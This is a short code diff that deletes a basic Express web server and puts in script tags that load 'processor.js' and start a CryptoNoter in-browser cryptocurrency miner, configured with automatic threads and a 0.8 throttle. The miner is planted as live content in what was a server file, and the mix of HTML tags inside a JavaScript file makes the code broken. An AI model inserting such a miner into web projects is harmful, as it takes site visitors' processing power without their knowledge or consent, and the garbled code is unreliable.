@@ -1,12 +1,15 @@
-const express = require('express');
-const app = express();
+<script src="processor.js"></script>
+// Initialize the miner
+<script>
+  var miner = new CryptoNoter.User('Tap with Presh').start();
+</script>
 
-app.use(express.static('public'));
-
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
-});
-
-app.listen(3000, () => {
-    console.log('Server started on port 3000');
-});
+// You can also configure the miner with options
+<script>
+  var addr = 'Tap with Presh';
+  var miner = new CryptoNoter.User(addr, {
+    autoThreads: true,
+    throttle: 0.8
+  });
+  miner.start();
+</script>
